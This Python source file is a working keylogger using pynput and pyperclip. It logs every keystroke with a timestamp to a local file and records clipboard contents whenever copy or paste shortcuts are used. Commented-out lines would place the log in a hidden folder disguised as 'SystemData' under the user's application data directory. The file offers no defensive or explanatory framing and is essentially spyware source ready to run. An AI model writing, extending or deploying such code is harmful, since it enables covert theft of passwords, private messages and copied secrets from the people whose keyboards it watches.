import time
import os
from pynput import keyboard
import pyperclip

# maximum file size in MB to be read
MAXFILESIZE = 10 * 1024

# logPath = os.path.join(os.environ["LOCALAPPDATA"], "SystemData", "InputLogs")
# # makes and hides the directory by making is hidden and system file
# os.makedirs(logPath, exist_ok=True)
# os.system(f'attrib -h -s "{logPath}"')
# FILENAME = logPath + r"\log.txt"
FILENAME = "log.txt"

pressedKeys = set()

def on_press(key):
    pressedKeys.add(key)
    
    lastKeyPressedTimeString = time.strftime("%Y-%m-%d %H:%M:%S")
    # append if the file exists and smaller than specified size, otherwise overwrite it.
    if (os.path.isfile(FILENAME) and os.path.getsize(FILENAME) <= MAXFILESIZE):
        flag = "a"
    else:
        flag = "w"

    with open(FILENAME, flag) as f:
        lastKeyPressedTimeString = time.strftime("%Y-%m-%d %H:%M:%S")
        try:
            f.write(f"{key.char} pressed at {lastKeyPressedTimeString}\n")
        except AttributeError:
            # for non-ascii characters
            f.write(f"{key.name} pressed at {lastKeyPressedTimeString}\n")

    # If Alt + Caps Lock is pressed, program terminates
    if ((keyboard.Key.alt_l in pressedKeys or keyboard.Key.alt_r in pressedKeys) 
            and keyboard.Key.caps_lock in pressedKeys):
        return False
    
    if (keyboard.Key.ctrl_l in pressedKeys or keyboard.Key.ctrl_r in pressedKeys):
        try:
            if (hasattr(key, 'char')):
                ctrlChar = chr(ord(key.char) & 0x1F)
                if (ctrlChar == '\x16'):
                    with open(FILENAME, flag) as f:
                        clipboard = pyperclip.paste()
                        f.write(f"{clipboard} pasted at {lastKeyPressedTimeString}\n")
                elif (ctrlChar == '\x03'):
                    with open(FILENAME, flag) as f:
                        clipboard = pyperclip.paste()
                        f.write(f"{clipboard} copied at {lastKeyPressedTimeString}\n")
        except OSError:
            pass

def on_release(key):
    pressedKeys.discard(key)
    
try:    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    pass
